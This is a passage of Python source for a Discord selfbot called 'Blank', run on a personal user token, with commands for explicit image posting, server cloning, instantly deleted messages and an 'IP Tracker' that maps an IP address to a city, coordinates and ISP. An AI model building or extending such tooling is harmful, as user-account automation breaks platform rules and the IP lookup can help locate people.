    except Exception:
        pass
        await ctx.channel.send(url)
        
@Blank.command()
async def lewd(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await lewd_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_lewd.{extent}'))
    except Exception:
        await ctx.channel.send(url)
        
@Blank.command()
async def femdom(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await femdom_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_femdom.{extent}'))
    except Exception:
        pass
        await ctx.channel.send(url)

@Blank.command()
async def cum(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await cum_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_cum.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command()
async def blowjob(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await bj_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_blowjob.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command()
async def pussy(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await pussy_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_pussy.{extent}'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command()
async def boobs(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    url=await boobs_gen()
    extent=url.rsplit(".", 1)[1]
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                file=await resp.read()
                file=io.BytesIO(file)
        await ctx.channel.send(file=discord.File(file, f'Blank_boobs.{extent}'))
    except Exception:
        await ctx.channel.send(url)



@Blank.command()
async def shorten(ctx, text=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if not text is None:
        if "<" in text or ">" in text:
            text=text.replace(">","")
            text=text.replace("<","")
        await ctx.channel.send(await short_link(text))

@Blank.command(aliases=["phc"])
async def phcomment(ctx, user: typing.Union[discord.Member, str]=None, *, text=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=Blank.user
    if text is None:
        text="I like it very much"
    if type(user)==str:
        text=f"{user} {text}"
        user=ctx.message.author
    name=user.display_name
    image=str(user.avatar_url_as(format="png"))
    url=await phcomment_gen(name, image, text)
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        file=io.BytesIO(dat)
        await ctx.channel.send(file=discord.File(file, 'Blank_ph.png'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=['e', 'emj'])
async def emoji(ctx, emoji=None):
    if emoji is None:
        pass
    else:
               if ":" in emoji:
                   emoji=(emoji.strip()).split(":")[1]
               
               for emojis in ctx.guild.emojis:
                    if emojis.name.lower()==str(emoji).lower() or str(emojis.id)==str(emoji):
                        emoji=emojis
                        try:
                            await ctx.message.delete()
                        except Exception:
                            pass
                        
                        url=str(emoji.url)
                        if ".gif" in url:
                            url=str(emoji.url_as(format='gif'))
                        else:
                            url=str(emoji.url_as(format='png'))
                            async with aiohttp.ClientSession(headers=headers) as session:
                                async with session.get(url,ssl=False) as resp:
                                    dat=await resp.read()
                        file=io.BytesIO(dat)
                        try:
                            if ".gif" in url:
                                await ctx.channel.send(file=discord.File(file, f'Blank_{emoji.name}.gif'))
                            else:
                                await ctx.channel.send(file=discord.File(file, f'Blank_{emoji.name}.png'))
                        except Exception:
                            await ctx.channel.send(url)

@Blank.command()
async def play(ctx, *, text=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Game(name=text))

@Blank.command()
async def watch(ctx, *, text=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=text))

@Blank.command()
async def listen(ctx, *, text=None):
    if not text == None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        global random_status
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=text))
        
@Blank.command(aliases=["rs"])
async def random_status(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    global random_status
    with open('config.json') as e:
        random_status=json.load(e)['random_status']
    if not random_status:
        random_status=True
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=True
            json.dump(f, e)
        await ctx.channel.send("Random statuses are now turned on", delete_after=2.0)
        await change_activity()
    else:
        random_status=False
        with open('config.json', 'w') as e:
            f={}
            f['random_status']=False
            json.dump(f, e)
        await Blank.change_presence(activity=None)
        await ctx.channel.send("Random statuses are now turned off", delete_after=2.0)
        
@Blank.command()
async def neko(ctx):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    for i in range(3):
        try:
            url=await neko_pic()
            extent=url.rsplit(".", 1)[1]
            break
        except Exception:
            await ctx.channel.send(url)
            return
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        img=io.BytesIO(dat)
        await ctx.channel.send(file=discord.File(img, f'Blank_neko.{extent}'))
    except Exception:
        await ctx.channel.send(url)
        
@Blank.command()
async def trash(ctx, user:discord.Member=None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    if user is None:
        user=ctx.message.author
    url=await trash_gen(str(user.avatar_url_as(format="png")))
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        file=io.BytesIO(dat)
        await ctx.channel.send(file=discord.File(file, 'Blank_trash.png'))
    except Exception:
        await ctx.channel.send(url)
    
@Blank.command(aliases=["sb", "stb"])
async def stickbug(ctx, user: discord.Member=None):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    if user is None:
        user=ctx.message.author
    await ctx.channel.send('It might take a few seconds', delete_after=2.0)
    url=await stickbug_vid(str(user.avatar_url_as(format="png")))
    m=await ctx.channel.send("It will take a little bit of time", delete_after=2.0)
    try:
        await m.delete()
    except Exception:
        pass
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url,ssl=False) as resp:
                dat=await resp.read()
        file=io.BytesIO(dat)
        await ctx.channel.send(file=discord.File(file, 'Blank_stickbug.mp4'))
    except Exception:
        await ctx.channel.send(url)

@Blank.command(aliases=["whois"])
async def userinfo(ctx, member: discord.Member = None):
  try:
            await ctx.message.delete()
  except Exception:
            pass
  if not member:
        member = ctx.message.author
  roles = ([role for role in member.roles[1:]])
  embed = discord.Embed(colour=discord.Colour.random())
  embed.set_thumbnail(url=member.avatar_url_as(format='png'))
  embed.set_author(name=member, icon_url=member.avatar_url_as(format='png'))
  embed.add_field(name="Display Name:", value=member.display_name, inline=False)
  embed.add_field(name="ID:", value=member.id, inline=False)
  acc_age= (datetime.now() - member.created_at).total_seconds()
  if acc_age<3600:
      acc_age="Less than an hour"
  elif acc_age<86400 and acc_age>=3600:
      acc_age=f"{int(acc_age/3600)} hours"
  elif acc_age>=86400 and acc_age<2592000:
      acc_age=f"{int(acc_age/86400)} days {int((acc_age%86400)/3600)} hours"
  elif acc_age<31104000 and acc_age>=2592000:
      acc_age=f"{int(acc_age/2592000)} months {int((acc_age%2592000)/86400)} days"
  else:
      acc_age=f"{int(acc_age/31104000)} years {int((acc_age%31104000)/2592000)} months {int(((acc_age%31104000)%2592000)/86400)} days"
  embed.add_field(name="Created Account On:", value=f'{member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC")} *({acc_age})*', inline=False)
  
  acc_age= (datetime.now() - member.joined_at).total_seconds()
  if acc_age<3600:
      acc_age="Less than an hour"
  elif acc_age<86400 and acc_age>=3600:
      acc_age=f"{int(acc_age/3600)} hours"
  elif acc_age>=86400 and acc_age<2592000:
      acc_age=f"{int(acc_age/86400)} days {int((acc_age%86400)/3600)} hours"
  elif acc_age<31104000 and acc_age>=2592000:
      acc_age=f"{int(acc_age/2592000)} months {int((acc_age%2592000)/86400)} days"
  else:
      acc_age=f"{int(acc_age/31104000)} years {int((acc_age%31104000)/2592000)} months {int(((acc_age%31104000)%2592000)/86400)} days"
  
  embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC")+f" *({acc_age})*", inline=False)
    
  if roles == []:
     embed.add_field(name="Highest Role:", value="None", inline=False)       
  else:
     embed.add_field(name="Highest Role:", value=member.top_role.mention, inline=False)
  try:
      await ctx.channel.send(embed=embed)
  except Exception:
      await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)

@Blank.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args=None):
    if args is None:
        return
    try:
            await ctx.message.delete()
    except Exception:
            pass
    try:
        await ctx.send(args, delete_after=0.0001)
    except Exception:
        pass
    
@Blank.command(aliases=["avatar", "pfp"])
async def av(ctx, user:discord.Member=None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    if user is None:
        user=ctx.message.author
    if not user.avatar:
        await ctx.channel.send("User does not has any avatar")
    else:
        if user.is_avatar_animated():
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(str(user.avatar_url_as(format='gif')),ssl=False) as resp:
                    dat=await resp.read()
            avatar=io.BytesIO(dat)
            try:
                await ctx.channel.send(file=discord.File(avatar, 'Blank_avatar.gif'))
            except Exception:
                await ctx.channel.send(str(user.avatar_url_as(format='gif')))
        else:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(str(user.avatar_url_as(format='png')),ssl=False) as resp:
                    dat=await resp.read()
            avatar=io.BytesIO(dat)
            try:
                await ctx.channel.send(file=discord.File(avatar, 'Blank_avatar.png'))
            except Exception:
                await ctx.channel.send(str(user.avatar_url_as(format="png")))
    
@Blank.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    await Blank.create_guild(f"copy - {ctx.guild.name}")
    await asyncio.sleep(2)
    for g in Blank.guilds:
        if f"copy - {ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}", bitrate=chann.bitrate, rtc_region=chann.rtc_region, user_limit=chann.user_limit, position=chann.position)
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}", nsfw=chann.is_nsfw(), topic=chann.topic, slowmode_delay=chann.slowmode_delay, position=chann.position)
            for roles in ctx.guild.roles:
                if not roles.name=="@everyone":
                    await g.create_role(name=roles.name, colour=roles.colour, permissions=roles.permissions, mentionable=roles.mentionable, hoist=roles.hoist)
                else:
                    await g.default_role.edit(colour=roles.colour, permissions=roles.permissions, mentionable=roles.mentionable, hoist=roles.hoist)
            
            for chann in ctx.guild.channels:
                    if isinstance(chann, discord.CategoryChannel):
                        pass
                    elif isinstance(chann, discord.VoiceChannel):
                        if chann.category_id is None:
                            await g.create_voice_channel(f"{chann}", bitrate=chann.bitrate, user_limit=chann.user_limit, rtc_region=chann.rtc_region, position=chann.position)
                    elif isinstance(chann, discord.TextChannel):
                        if chann.category_id is None:
                            await g.create_text_channel(f"{chann}", nsfw=chann.is_nsfw(), topic=chann.topic, slowmode_delay=chann.slowmode_delay, position=chann.position)
                    else:
                        pass
                           
    try:
        guild_icon=ctx.guild.icon_url
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(str(guild_icon),ssl=False) as resp:
                dat=await resp.read()
        await g.edit(icon=dat)
    except Exception:
        pass

@Blank.command(aliases=["fancy"])
async def ascii(ctx, *, text=None):
    if text is None:
        return
    try:
            await ctx.message.delete()
    except Exception:
            pass
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}',ssl=False) as resp:
            r=await resp.text()
    if len('```\n' + r + '```') > 2000:
        return
    await ctx.send(f"```\n{r}```")
@Blank.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))

@Blank.command()
async def embed(ctx, image_url=None, *, description=None):
    working=False
    if not image_url is None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        if not "http://" in image_url and not "https://" in image_url:
            if not description is None:
                description=f"{image_url} {description}"
            else:
                description=image_url
            image_url=None
        else:
            image_url=image_url.replace("<","")
            image_url=image_url.replace(">","")
            working=await is_image_url(image_url)
            if working==False:
                if not description is None:
                    description=f"{image_url} {description}"
                else:
                    description=image_url
                image_url=None
        if description is None:
            description=""
        embed=discord.Embed(description=description, colour=discord.Colour.random())
        if image_url is not None:
            embed.set_image(url=image_url)
        try:
            await ctx.channel.send(embed=embed)
        except Exception:
            await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)

@Blank.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=4&image="
    if user is None:
        avatar = str(ctx.message.author.avatar_url_as(format="png"))
        endpoint += avatar
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(endpoint,ssl=False) as resp:
                res=await resp.json()
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(res['message'],ssl=False) as resp:
                    image=await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "Blank_magik.png"))
        except Exception:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(endpoint,ssl=False) as resp:
                res=await resp.json()
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(res['message'],ssl=False) as resp:
                    image=await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "Blank_magik.png"))
        except Exception:
            await ctx.send(res['message'])

@Blank.command(aliases=["df"])
async def deepfry(ctx, user: discord.Member = None):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.message.author.avatar_url_as(format="png"))
        endpoint += avatar
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(endpoint,ssl=False) as resp:
                res=await resp.json()
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(res['message'],ssl=False) as resp:
                    image=await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "Blank_deep_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(endpoint,ssl=False) as resp:
                res=await resp.json()
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(res['message'],ssl=False) as resp:
                    image=await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, "Blank_deep_fry.png"))
        except:
            await ctx.send(res['message'])
 
@Blank.command()
async def roll(ctx, numa: int=None, numb: int=None):
    if numa is None:
        return
    if numa!=int or numb!=int:
        return
    await ctx.message.delete()
    n = random.randint(numa, numb)
    await ctx.send("I choose...```\n"+str(n)+"```")          
            
@Blank.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):
    try:
            await ctx.message.delete()
    except Exception:
            pass
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get('https://www.conversationstarters.com/wyrqlist.php',ssl=False) as resp:
            r=await resp.text()
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"**Would you rather?**```\n{qa}\nor\n{qb}```")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")

@Blank.command()
async def topic(ctx): 
    try:
        await ctx.message.delete()
    except Exception:
        pass
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get('https://www.conversationstarters.com/generator.php',ssl=False) as resp:
            r=await resp.text()
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send("```\n"+topic+"```")            
            
@Blank.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str=None):
    if ipaddr is None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        await ctx.channel.send("You have to enter IP address too")
    else:
        await ctx.message.delete()
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(f'http://ip-api.com/json/{ipaddr}?fields=26961913', ssl=False) as resp:
                temp=await resp.text()
        temp=temp.replace('""', '"(No info)"')
        geo=json.loads(temp)
    
        if geo['status']=='success':
            try:
                em=discord.Embed(title='__IP Tracker__', colour=discord.Colour.random())
                em.add_field(name="**IP Address**", value=f"`{geo['query']}`", inline=False)
                em.add_field(name="**Continent**", value=f"`{geo['continent']}`", inline=False)
                em.add_field(name="**Country**", value=f"`{geo['country']}`", inline=False)
                em.add_field(name="**Region**", value=f"`{geo['regionName']}`", inline=False)
                em.add_field(name="**City**", value=f"`{geo['city']}`", inline=False)
                em.add_field(name="**District**", value=f"`{geo['district']}`", inline=False)
                em.add_field(name="**ZIP Code**", value=f"`{geo['zip']}`", inline=False)
                em.add_field(name="**Latitude**", value=f"`{geo['lat']}`", inline=False)
                em.add_field(name="**Longitude**", value=f"`{geo['lon']}`", inline=False)
                em.add_field(name="**Time Zone**", value=f"`{geo['timezone']}`", inline=False)
                em.add_field(name="**Currency**", value=f"`{geo['currency']}`", inline=False)
                em.add_field(name="**ISP**", value=f"`{geo['isp']}`", inline=False)
                em.add_field(name="**Organisation**", value=f"`{geo['org']}`", inline=False)
                em.add_field(name="**Mobile Network**", value=f"`{geo['mobile']}`", inline=False)
                em.add_field(name="**Hosting**", value=f"`{geo['hosting']}`", inline=False)
                em.add_field(name="**Proxy**", value=f"`{geo['proxy']}`", inline=False)
                await ctx.channel.send(embed=em)
            except Exception:
                await ctx.channel.send(f"```\nIP Tracker\n\nIP Address: {geo['query']}\nContinent: {geo['continent']}\nCountry: {geo['country']}\nRegion: {geo['regionName']}\nCity: {geo['city']}\nDistrict: {geo['district']}\nZIP Code: {geo['zip']}\nLatitude: {geo['lat']}\nLongitude: {geo['lon']}\nTime Zone: {geo['timezone']}\nCurrency: {geo['currency']}\nISP: {geo['isp']}\nOrganisation: {geo['isp']}\nMobile Data: {geo['mobile']}\n Hosting: {geo['hosting']}\nProxy: {geo['proxy']}```")
        else:
            await ctx.channel.send("Invalid IP Address", delete_after=2.0)
            
@Blank.command()
async def gender(ctx, name: str=None):
    if name is not None:
        try:
            await ctx.message.delete()
        except Exception:
            pass
        await ctx.channel.send(await gender_info(name))

async def anime_info(anime: str):
    return Anime(anime)

@Blank.command()
async def anime(ctx, *, anime: str=None):
    if anime is None:
        return
    try:
            await ctx.message.delete()
    except Exception:
            pass
    anime=await anime_info(anime)
    aurl=anime.url
    animetitle=anime.title_english
    adesc=anime.description.replace("[Written by MAL Rewrite]", "")
    titlealt=anime.alt_titles
    ratings=anime.rating
    if anime.type.lower()=="tv":
        atype="TV Series"
    else:
        atype=anime.type
    genres=', '.join(anime.genres)
    poster=anime.poster
    anieps=anime.episodes
    if anime.is_nsfw()==True:
        nsfwa="Yes"
    else:
        nsfwa="No"
    try:
        em=discord.Embed(title="Anime Info", url=aurl,description=f"**English Title:** {animetitle}\n\n**Other Title(s):** {titlealt}\n\n**Type**: {atype}\n\n**Genres**: {genres}\n\n**Episodes:** {anieps}\n\n**Ratings:** {ratings}\n\n**NSFW Status:** {nsfwa}\n\n**Plot/Synopsis:** ```\n\n{adesc}```", color=discord.Color.random())
        em.set_image(url=poster)
        await ctx.channel.send(embed=em)
    except Exception:
        message=f"```\nEnglish Title: {animetitle}\n\nOther Title(s): {titlealt}\n\nType: {atype}\n\nGenres: {genres}\n\nEpisodes: {anieps}\n\nRatings: {ratings}\n\nNSFW Status: {nsfwa}\n\nPlot/Synopsis:\n\n{adesc}```"
        await ctx.channel.send(message)
try:
    Blank.run(token, bot=False)
except discord.errors.HTTPException and discord.errors.LoginFailure:
    print(colored('You Entered Wrong Token', 'red'))
